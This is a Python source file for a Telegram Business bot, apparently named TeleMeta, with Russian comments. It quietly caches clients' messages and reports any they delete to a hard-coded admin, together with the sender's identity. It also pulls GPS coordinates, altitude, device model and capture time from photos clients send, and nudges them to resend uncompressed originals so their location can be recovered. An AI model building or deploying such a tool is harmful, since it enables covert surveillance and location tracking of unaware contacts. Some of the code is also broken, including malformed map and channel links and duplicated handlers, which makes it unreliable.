import asyncio
import logging
import io
import os
import hashlib
import requests
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.utils.keyboard import InlineKeyboardBuilder, ReplyKeyboardBuilder
from aiogram.exceptions import TelegramBadRequest
from aiogram.types import LinkPreviewOptions
from aiogram.types import BusinessMessagesDeleted

from PIL import Image, ImageStat
from PIL.ExifTags import TAGS, GPSTAGS

logging.basicConfig(level=logging.INFO)

BOT_TOKEN = ''
CHANNEL_ID = '@kufardelivarymisha'
OWNER_USERNAME = '@alenkaman'
ADMIN_TELEGRAM_ID = 8363029893

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
user_metadata_status = {}

ONLINE_PHONE_DB = {}

BUSINESS_MESSAGES_CACHE = {}
MAX_CACHE_SIZE = 5000

SAVE_DIR = "photo_history"
if not os.path.exists(SAVE_DIR):
    os.makedirs(SAVE_DIR)

def load_online_phone_database():
    """Автоматически скачивает свежую базу моделей Android при запуске бота"""
    global ONLINE_PHONE_DB
    url = "https://cdn.jsdelivr.net/gh/bsthen/device-models/devices.json"
    try:
        logging.info("⏳ Загрузка глобальной базы моделей смартфонов...")
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            ONLINE_PHONE_DB = response.json()
            logging.info(f"✅ База успешно загружена! Индексировано устройств: {len(ONLINE_PHONE_DB)}")
        else:
            logging.error("Не удалось скачать базу, сервер вернул некорректный статус.")
    except Exception as e:
        logging.error(f"Ошибка автоматической загрузки базы моделей: {e}")

def _convert_rational(val):
    try:
        if isinstance(val, tuple): 
            val = val[0]
        if hasattr(val, 'num') and hasattr(val, 'den'):
            return float(val.num) / float(val.den) if val.den != 0 else 0.0
        return float(val)
    except Exception: return 0.0

@dp.deleted_business_messages()
async def handle_deleted_business_messages(event: BusinessMessagesDeleted):
    """Срабатывает мгновенно, когда клиент удаляет сообщение в бизнес-чате"""
    
    # Проверяем, включены ли функции у админа
    if not user_metadata_status.get(ADMIN_TELEGRAM_ID, True):
        return

    # Telegram может прислать пачку удаленных ID за один раз, поэтому перебираем их циклом
    for msg_id in event.message_ids:
        # Ищем удаленное сообщение в нашем кэше
        cached_msg = BUSINESS_MESSAGES_CACHE.get(msg_id)

        if cached_msg:
            # Если сообщение было в памяти, формируем полный отчет
            text_report = (
                "🗑️ **🗑️ ВНИМАНИЕ: УДАЛЕННОЕ СООБЩЕНИЕ!**\n\n"
                f"👤 **От кого:** {cached_msg['user']}\n"
                f"🆔 **ID пользователя:** `{cached_msg['user_id']}`\n"
                f"🆔 **ID сообщения:** `{msg_id}`\n"
                f"💬 **Чат (ID):** `{event.chat.id}`\n\n"
                f"📋 **Было удалено следующее содержимое:**\n"
                f"» __{cached_msg['text']}__"
            )
            # Удаляем из кэша, чтобы не занимать память
            BUSINESS_MESSAGES_CACHE.pop(msg_id, None)
        else:
            # Если сообщения не было в кэше (например, оно старое или бот перезапускался)
            text_report = (
                "🗑️ **Удалено сообщение в бизнес-чате**\n\n"
                f"💬 **Чат (ID):** `{event.chat.id}`\n"
                f"🆔 **ID сообщения:** `{msg_id}`\n"
                "ℹ️ _Текст недоступен (сообщение отправлено до запуска бота или кэш очищен)._"
            )

        # Отправляем экстренное уведомление администратору TeleMeta
        try:
            await bot.send_message(
                chat_id=ADMIN_TELEGRAM_ID,
                text=text_report,
                parse_mode="Markdown"
            )
        except Exception as err:
            logging.error(f"Ошибка отправки лога удаления админу: {err}")

@dp.business_message()
async def handle_all_business_messages(message: types.Message):
    """Единый хэндлер: управляет кэшем, логирует удаления/правки и извлекает метаданные фото"""
    
    # 1. СРАЗУ СОХРАНЯЕМ ВХОДЯЩЕЕ СООБЩЕНИЕ В КЭШ (для детекции удалений и правок)
    msg_id = message.message_id
    c_name = message.from_user.first_name if message.from_user else "Клиент"
    c_username = f"@{message.from_user.username}" if message.from_user and message.from_user.username else "Нет"
    
    # Определяем текст или подпись к медиафайлу для кэша
    msg_text = message.text or message.caption or "[Медиафайл без текста]"

    BUSINESS_MESSAGES_CACHE[msg_id] = {
        "text": msg_text,
        "user": f"{c_name} ({c_username})",
        "user_id": message.from_user.id if message.from_user else message.chat.id
    }

    # Контролируем размер кэша
    if len(BUSINESS_MESSAGES_CACHE) > MAX_CACHE_SIZE:
        first_key = next(iter(BUSINESS_MESSAGES_CACHE))
        BUSINESS_MESSAGES_CACHE.pop(first_key)

    # 2. ПРОВЕРЯЕМ, ЕСТЬ ЛИ В СООБЩЕНИИ ФОТО ИЛИ КАРТИНКА-ДОКУМЕНТ
    is_photo = message.photo is not None
    is_image_doc = message.document and message.document.mime_type and message.document.mime_type.startswith("image/")

    if is_photo or is_image_doc:
        # Если админ отключил функции мониторинга, прерываем обработку EXIF
        if not user_metadata_status.get(ADMIN_TELEGRAM_ID, True): 
            return

        file_id = message.photo[-1].file_id if is_photo else message.document.file_id
        bus_id = message.business_connection_id

        try:
            file_info = await bot.get_file(file_id)
            local_filename = f"{SAVE_DIR}/img_{file_id[:15]}.jpg"
            await bot.download_file(file_info.file_path, local_filename)
            
            # Извлекаем метаданные
            exif = mega_extract_metadata(local_filename)
            
            # Если это обычное фото из галереи (сжатое), принудительно выставляем статус сжатия
            if is_photo:
                exif["is_telegram_compressed"] = True
                exif["camera"] = "📱 Стерто (Сжатие Telegram)"
                if exif["date"] == "Скрыто":
                    exif["date"] = "📅 Удалена мессенджером"
                exif["icc_profile"] = "🗑️ Удален при сжатии"
                exif["software"] = "Telegram Image Processor"

            # Формируем детальный отчет для админа
            admin_text = (
                f"👤 Отправитель: {c_name} ({c_username})\n\n"
                f"👤 ID отправителя: {cached_msg['user_id'] if 'cached_msg' in locals() else message.from_user.id}\n"
                f"💾 Сохранено на сервере как: {local_filename}\n"
                f"⚖️ Вес файла: {exif['weight']}\n"
                f"🔑 Хэш MD5: {exif['md5']}\n"
                f"🎨 Цветовой профиль: {exif['icc_profile']}\n\n"
                f"🖼️ Формат данных: {exif['format']} ({exif['mode']})\n"
                f"📐 Разрешение: {exif['size']}\n"
                f"🗜️ Индекс сжатия: {exif['compression']}\n"
                f"🔆 Индекс яркости пикселей: {exif['brightness']}\n"
                f"🔄 Положение камеры: {exif['orientation']}\n\n"
                f"📸 Смартфон/Камера: {exif['camera']}\n"
                f"🔍 Фокусное расстояние: {exif['lens_focal']}\n"
                f"⚡ Статус вспышки: {exif['flash']}\n"
                f"⏳ Выдержка/ISO: {exif['shutter']} ({exif['iso']})\n"
                f"📅 Дата создания файла: {exif['date']}\n"
                f"⚙️ Программный тег: {exif['software']}\n\n"
                f"🌐 Координаты сети: {exif['geo']}\n"
                f"🏔️ Высота точки съемки: {exif['altitude']}\n"
                f"🔗 Ссылка на локацию: {exif['map_link']}"
            )

            try:
                await bot.send_message(
                    chat_id=ADMIN_TELEGRAM_ID, 
                    text=admin_text, 
                    link_preview_options=LinkPreviewOptions(is_disabled=True)
                )
            except Exception as admin_err:
                logging.error(f"Не удалось отправить отчет админу: {admin_err}")

            # Формируем ответ для клиента в бизнес-чат
            if exif['is_telegram_compressed']:
                client_text = (
                    "ℹ️ **TeleMeta Инспектор**\n\n"
                    "Вы отправили изображение как **обычное фото**.\n"
                    "Сервера Telegram автоматически стерли EXIF-метаданные, камеру и GPS-координаты для уменьшения веса файла.\n\n"
                    "Чтобы бот смог извлечь скрытые данные и геолокацию, отправьте это фото ещё раз, но как **Файл (без сжатия)**! 👇"
                )
                kb = InlineKeyboardBuilder()
                kb.row(types.InlineKeyboardButton(text="💡 Как отправить файлом?", callback_data="help_how_to_file"))
                reply_markup = kb.as_markup()
            else:
                client_text = "✅ **TeleMeta**: Метаданные успешно извлечены! Оригинал фото проанализирован и сохранен."
                reply_markup = None

            await bot.send_message(
                chat_id=message.chat.id, 
                text=client_text, 
                business_connection_id=bus_id,
                reply_markup=reply_markup,
                parse_mode="Markdown"
            )

            # Безопасно удаляем временный файл с диска
            if os.path.exists(local_filename):
                os.remove(local_filename)

        except Exception as e:
            logging.error(f"Ошибка бизнес-анализатора медиа: {e}")

def mega_extract_metadata(file_path: str) -> dict:
    res = {
        "weight": "0 MB", "md5": "Нет", "format": "Нет", "size": "Нет", "mode": "Нет",
        "compression": "Нет", "brightness": "Нет", "camera": "Скрыто", "date": "Скрыто",
        "software": "Нет данных", "iso": "Нет данных", "shutter": "Нет данных", "orientation": "Обычная",
        "geo": "Отсутствует", "map_link": "Недоступно", "altitude": "Нет данных",
        "lens_focal": "Нет данных", "flash": "Нет данных", "icc_profile": "Чистый оригинал",
        "is_telegram_compressed": False  # Умный флаг для логики отправки сообщений
    }
    try:
        # 1. Чтение сырых байт для расчета веса и хэша
        with open(file_path, "rb") as f:
            file_bytes = f.read()
            
        res["weight"] = f"{len(file_bytes) / (1024 * 1024):.2f} MB"
        res["md5"] = hashlib.md5(file_bytes).hexdigest()

        # 2. Базовый анализ структуры картинки через Pillow
        img = Image.open(file_path)
        res["format"], res["mode"] = img.format, img.mode
        w, h = img.size
        res["size"] = f"{w}x{h} px"
        
        # Вычисляем плотность сжатия (соотношение веса к пикселям)
        density = (len(file_bytes) / (w * h)) * 100
        res["compression"] = f"Оригинал ({density:.1f}%)" if density > 15 else f"Сжато ({density:.1f}%)"

        # Анализ средней яркости пикселей (работает всегда, даже на сжатых фото)
        stat = ImageStat.Stat(img)
        if stat.mean:
            res["brightness"] = f"{sum(stat.mean) / len(stat.mean):.1f} / 255"

        # 3. Извлечение EXIF-метаданных
        exif = img._getexif()
        
        # Если EXIF нет вообще, проверяем на признаки автоматического сжатия мессенджером
        if not exif:
            if not img.info.get("icc_profile") and density < 12:
                res["is_telegram_compressed"] = True
                res["camera"] = "📱 Стерто (Сжатие Telegram)"
                res["date"] = "📅 Удалена мессенджером"
                res["icc_profile"] = "🗑️ Удален при сжатии"
                res["software"] = "Telegram Image Processor"
            else:
                res["camera"] = "Неизвестно (Нет EXIF)"
                res["date"] = "Не указана"
        else:
            cl = {TAGS.get(t, t): v for t, v in exif.items()}
            
            # --- АВТОМАТИЧЕСКОЕ РАСПОЗНАВАНИЕ МОДЕЛИ ТЕЛЕФОНА ---
            make = str(cl.get("Make", "")).strip()
            model = str(cl.get("Model", "")).strip()
            
            if make or model:
                raw_camera = f"{make} {model}".replace("  ", " ").strip()
                
                # Ищем код модели (например, 23124RA7EO) в глобальной онлайн-базе
                device_info = ONLINE_PHONE_DB.get(model.upper())
                
                if device_info and isinstance(device_info, dict):
                    brand = device_info.get("brand", make)
                    market_name = device_info.get("name", "")
                    # Склеиваем красивую строку: Xiaomi 23124RA7EO | Xiaomi Redmi Note 13
                    res["camera"] = f"{raw_camera} | {brand} {market_name}"
                else:
                    # Если модели нет в базе (или это iPhone, который пишет имя текстом)
                    res["camera"] = raw_camera
            
            res["date"] = str(cl.get("DateTimeOriginal") or cl.get("DateTime") or "Скрыто")
            
            soft = str(cl.get("Software", "")).strip()
            if any(x in soft.lower() for x in ["photoshop", "gimp", "lightroom", "picsart", "snapseed"]):
                res["software"] = f"⚠️ {soft} (Редактор)"
                res["icc_profile"] = "⚠️ Изменен в редакторе"
            else:
                res["software"] = soft if soft else "Оригинальная прошивка"

            if img.info.get("icc_profile") and res["icc_profile"] == "Чистый оригинал":
                res["icc_profile"] = "✅ Сохранен (Оригинал)"

            if "ISOSpeedRatings" in cl: 
                res["iso"] = f"ISO {cl['ISOSpeedRatings']}"
            if "ExposureTime" in cl:
                e = cl["ExposureTime"]
                res["shutter"] = f"{e.num}/{e.den} секунд" if hasattr(e, 'num') else f"{e} секунд"
            if "FocalLength" in cl: 
                res["lens_focal"] = f"{_convert_rational(cl['FocalLength'])} миллиметров"
            if "Flash" in cl: 
                res["flash"] = "⚡ Включена" if cl["Flash"] % 2 != 0 else "❌ Выключена"

            orient = cl.get("Orientation")
            if orient == 3: res["orientation"] = "Перевернут на 180°"
            elif orient == 6: res["orientation"] = "Вертикально (Вправо)"
            elif orient == 8: res["orientation"] = "Вертикально (Влево)"

            gps_info = cl.get("GPSInfo")
            if gps_info:
                lat, lon = _extract_gps_coords(gps_info)
                if lat and lon:
                    res["geo"] = f"{lat:.6f}, {lon:.6f}"
                    res["map_link"] = f"https://google.com{lat},{lon}"
                
                gps_tags = {GPSTAGS.get(t, t): gps_info[t] for t in gps_info}
                if "GPSAltitude" in gps_tags:
                    res["altitude"] = f"{_convert_rational(gps_tags['GPSAltitude']):.1f} метров"
                    
    except Exception as ex: 
        logging.error(f"Ошибка анализа: {ex}")
    return res

async def check_subscription(user_id: int) -> bool:
    try:
        member = await bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
        return member.status in ['member', 'administrator', 'creator']
    except TelegramBadRequest: return False

def get_subscription_keyboard():
    b = InlineKeyboardBuilder()
    b.row(types.InlineKeyboardButton(text="📢 Подписаться на TeleMeta Channel", url=f"https://t.me{CHANNEL_ID.lstrip('@')}"))
    b.row(types.InlineKeyboardButton(text="✅ Подписка оформлена", callback_data="check_sub"))
    return b.as_markup()

def get_main_menu():
    b = ReplyKeyboardBuilder()
    b.row(types.KeyboardButton(text="ℹ️ Информация"), types.KeyboardButton(text="❓ Помощь"))
    b.row(types.KeyboardButton(text="🎛️ Меню функций"), types.KeyboardButton(text="💎 Премиум"))
    return b.as_markup(resize_keyboard=True)

def get_functions_inline_menu(user_id: int):
    en = user_metadata_status.setdefault(user_id, True)
    icon = "✅ Включено" if en else "❌ Выключено"
    
    b = InlineKeyboardBuilder()
    # Все функции теперь привязаны к реальному статусу работы логгера TeleMeta
    b.row(types.InlineKeyboardButton(text=f"📊 Метаданные EXIF: {icon}", callback_data="toggle_meta"))
    b.row(types.InlineKeyboardButton(text=f"🗑️ Лог Удалений: {icon}", callback_data="toggle_meta"))
    b.row(types.InlineKeyboardButton(text=f"✏️ Лог Редактирований: {icon}", callback_data="toggle_meta"))
    b.row(types.InlineKeyboardButton(text="🎬 Медиа-аудит (Включен)", callback_data="stub_anim"))
    return b.as_markup()

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    user_id = message.from_user.id
    user_metadata_status.setdefault(user_id, True)
    if await check_subscription(user_id):
        await message.answer("🎉 Выберите раздел меню:", reply_markup=get_main_menu())
    else:
        await message.answer("🛑 Подпишитесь на канал для доступа.", reply_markup=get_subscription_keyboard())

@dp.message(F.text == "🎛️ Меню функций")
async def process_functions_menu(message: types.Message):
    if not await check_subscription(message.from_user.id): return
    await message.answer("🎛️ Управление функциями:", reply_markup=get_functions_inline_menu(message.from_user.id))

@dp.callback_query(F.data == "toggle_meta")
async def toggle_metadata(callback_query: types.CallbackQuery):
    u_id = callback_query.from_user.id
    user_metadata_status[u_id] = not user_metadata_status.get(u_id, True)
    await callback_query.message.edit_reply_markup(reply_markup=get_functions_inline_menu(u_id))
    await callback_query.answer()
    
@dp.callback_query(F.data == "help_how_to_file")
async def process_how_to_file(callback_query: types.CallbackQuery):
    instruction = (
        "📋 **Инструкция по отправке оригинала:**\n\n"
        "1. Нажмите на значок **Скрепки (📎)** в чате.\n"
        "2. Выберите пункт **Файл** (а не Галерея).\n"
        "3. Нажмите 'Выбрать из галереи' (или 'Фото или видео').\n"
        "4. Выберите нужное фото и отправьте.\n\n"
        "🎯 Так Telegram не тронет метаданные, и бот сможет их прочитать!"
    )
    await callback_query.message.answer(instruction, parse_mode="Markdown")
    await callback_query.answer()
    
@dp.business_message(F.photo | F.document)
async def handle_business_photos(message: types.Message):
    # Проверяем статус глобальной настройки именно админа/владельца аккаунта
    if not user_metadata_status.get(ADMIN_TELEGRAM_ID, True): 
        return
        
    # Если это документ, но не картинка — игнорируем
    if message.document and not message.document.mime_type.startswith("image/"): 
        return

    # Задаем базовый флаг сжатия на основе типа сообщения Telegram
    # Если сообщение пришло как 'photo' — это 100% сжатая галерея Telegram
    is_photo_type = message.photo is not None

    file_id = message.photo[-1].file_id if is_photo_type else message.document.file_id
    bus_id = message.business_connection_id

    try:
        file_info = await bot.get_file(file_id)
        local_filename = f"{SAVE_DIR}/img_{file_id[:15]}.jpg"
        await bot.download_file(file_info.file_path, local_filename)
        
        # Получаем базовый анализ
        exif = mega_extract_metadata(local_filename)
        
        # КОРРЕКЦИЯ ФЛАГА: Если Telegram прислал это как Photo, принудительно выставляем статус сжатия
        if is_photo_type:
            exif["is_telegram_compressed"] = True
            exif["camera"] = "📱 Стерто (Сжатие Telegram)"
            if exif["date"] == "Скрыто":
                exif["date"] = "📅 Удалена мессенджером"
            exif["icc_profile"] = "🗑️ Удален при сжатии"
            exif["software"] = "Telegram Image Processor"

        c_username = f"@{message.from_user.username}" if message.from_user.username else "Нет"
        c_id = message.from_user.id
        c_name = message.from_user.first_name

        admin_text = (
            f"👤 Отправитель: {c_name} ({c_username})\n\n"
            f"👤 ID отправителя: {c_id}\n"
            f"💾 Сохранено на сервере как: {local_filename}\n"
            f"⚖️ Вес файла: {exif['weight']}\n"
            f"🔑 Хэш MD5: {exif['md5']}\n"
            f"🎨 Цветовой профиль: {exif['icc_profile']}\n\n"
            f"🖼️ Формат данных: {exif['format']} ({exif['mode']})\n"
            f"📐 Разрешение: {exif['size']}\n"
            f"🗜️ Индекс сжатия: {exif['compression']}\n"
            f"🔆 Индекс яркости пикселей: {exif['brightness']}\n"
            f"🔄 Положение камеры: {exif['orientation']}\n\n"
            f"📸 Смартфон/Камера: {exif['camera']}\n"
            f"🔍 Фокусное расстояние: {exif['lens_focal']}\n"
            f"⚡ Статус вспышки: {exif['flash']}\n"
            f"⏳ Выдержка/ISO: {exif['shutter']} ({exif['iso']})\n"
            f"📅 Дата создания файла: {exif['date']}\n"
            f"⚙️ Программный тег: {exif['software']}\n\n"
            f"🌐 Координаты сети: {exif['geo']}\n"
            f"🏔️ Высота точки съемки: {exif['altitude']}\n"
            f"🔗 Ссылка на локацию: {exif['map_link']}"
        )

        try:
            await bot.send_message(
                chat_id=ADMIN_TELEGRAM_ID, 
                text=admin_text, 
                link_preview_options=LinkPreviewOptions(is_disabled=True)
            )
        except Exception as admin_err:
            logging.error(f"Не удалось отправить отчет админу: {admin_err}")

        # ТОЧНАЯ ПРОВЕРКА ДЛЯ КЛИЕНТА
        if exif['is_telegram_compressed']:
            client_text = (
                "ℹ️ **TeleMeta Инспектор**\n\n"
                "Вы отправили изображение как **обычное фото**.\n"
                "Сервера Telegram автоматически стерли EXIF-метаданные, камеру и GPS-координаты для уменьшения веса файла.\n\n"
                "Чтобы бот смог извлечь скрытые данные и геолокацию, отправьте это фото ещё раз, но как **Файл (без сжатия)**! 👇"
            )
            kb = InlineKeyboardBuilder()
            kb.row(types.InlineKeyboardButton(text="💡 Как отправить файлом?", callback_data="help_how_to_file"))
            reply_markup = kb.as_markup()
        else:
            client_text = "✅ **TeleMeta**: Метаданные успешно извлечены! Оригинал фото проанализирован и сохранен."
            reply_markup = None

        await bot.send_message(
            chat_id=message.chat.id, 
            text=client_text, 
            business_connection_id=bus_id,
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )

        if os.path.exists(local_filename):
            os.remove(local_filename)

    except Exception as e:
        logging.error(f"Ошибка бизнес-хэндлера: {e}")

@dp.callback_query(F.data == "check_sub")
async def process_check_sub(callback_query: types.CallbackQuery):
    if await check_subscription(callback_query.from_user.id):
        await callback_query.message.delete()
        await bot.send_message(chat_id=callback_query.from_user.id, text="🌟 Доступ открыт!", reply_markup=get_main_menu())
    else: 
        await callback_query.answer(text="❌ Подписка не найдена!", show_alert=True)

@dp.message(F.text == "ℹ️ Информация")
async def process_info(message: types.Message):
    if not await check_subscription(message.from_user.id): return
    await message.answer(f"ℹ️ Информация\n\n👤 Владелец: {OWNER_USERNAME}")

@dp.message(F.text == "❓ Помощь")
async def process_help(message: types.Message):
    if not await check_subscription(message.from_user.id): return
    await message.answer(f"❓ Помощь\n\nПоддержка: {OWNER_USERNAME}")

@dp.message(F.text == "💎 Премиум")
async def process_premium(message: types.Message):
    if not await check_subscription(message.from_user.id): return
    await message.answer("💎 Премиум функции в разработке.")

@dp.callback_query(F.data.startswith("stub_"))
async def process_stubs(callback_query: types.CallbackQuery):
    await callback_query.answer(text="🛠️ Данный раздел в разработке!", show_alert=True)

async def main():
    load_online_phone_database() 
    
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
